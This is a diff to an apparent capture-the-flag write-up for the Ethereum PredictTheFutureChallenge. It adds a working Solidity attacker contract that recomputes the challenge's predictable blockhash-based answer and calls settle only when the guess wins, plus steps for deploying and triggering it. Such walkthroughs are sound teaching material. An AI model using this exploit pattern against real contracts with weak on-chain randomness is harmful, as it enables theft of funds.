@@ -284,7 +284,8 @@ interface GuessTheNewRandomNumberChallengeInterface {
 /// @title The contract that we will use to call the GuessTheNewRandomNumberChallenge contract
 contract CallingContract {
     // owner -> Store the owner of the contract so you will be able to get your ether back
-    address public owner = msg.sender;
+    address owner = msg.sender;
+    
     /**
       * @notice Create a fallback function that is payable so the
       * GuessTheNewRandomNumberChallenge contract can send you back the Ether
@@ -359,3 +360,68 @@ contract PredictTheFutureChallenge {
 }
 ```
 
+As we have to lock our guess before the answer is generated, we have to predict the block where our transaction will be added. This is quite the same problem as above...
+
+One way to make this lottery totally unfair, is that we can see if we have the right answer before calling the `settle` function.
+
+```javascript
+pragma solidity ^0.4.21;
+// Declare an interface in order to use the PredictTheFutureChallenge functions
+interface PredictTheFutureChallenge {
+    function lockInGuess(uint8 n) external payable;
+    function settle() external;
+}
+/// @title The contract that we will use to call the PredictTheFutureChallengeCaller contract
+contract PredictTheFutureChallengeCaller {
+    // owner -> Store the owner of the contract so you will be able to get your ether back
+    address owner = msg.sender;
+    // guesses -> stores a guess for a given contract address
+    mapping (address => uint8) guesses;
+
+    /**
+      * @notice Create a fallback function that is payable so the
+      * PredictTheFutureChallenge contract can send you back the Ether
+      */
+    function () public payable {}
+
+    /**
+      * @notice withdraw -> Bankrupt the contract, sending all Ether to owner
+      */
+    function withdraw() public {
+        require(msg.sender == owner);
+        owner.transfer(address(this).balance);
+    }
+
+    /**
+      * @notice makeGuess -> Calls guess function at a given address
+      * @param address The address of the deployed PredictTheFutureChallenge contract
+      * @param n The number you wish to guess (between 0 and 9)
+      */
+    function makeGuess(address contractAddress, uint8 n) public payable {
+        require(msg.value == 1 ether);
+        PredictTheFutureChallenge challenge = PredictTheFutureChallenge(contractAddress);
+        challenge.lockInGuess.value(1 ether)(n);
+        guesses[contractAddress] = n;
+    }
+
+    /**
+      * @notice win -> Calls settle function at a given address, only if you have the right answer
+      * @param address The address of the deployed PredictTheFutureChallenge contract
+      */
+    function win(address contractAddress) public returns (uint8) {
+        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
+        if(answer == guesses[contractAddress]){
+            PredictTheFutureChallenge challenge = PredictTheFutureChallenge(contractAddress);
+            challenge.settle();
+        }
+        return answer;
+    }
+}
+```
+
+Now you can deploy the `PredictTheFutureChallengeCaller` contract and call the `makeGuess` function in order to lock a guess between 0 and 9.
+Wait for 1 block to be mined (that really doesn't take a lot of time), then try to win calling the `win` function. Notice that you might need to put more gas limit as the `win` function will trigger an internal call that will send you ether back... consuming more gas.
+
+![Win](https://media.giphy.com/media/l3q2Z6S6n38zjPswo/giphy.gif)
+
+> Got you ! :sunglasses:
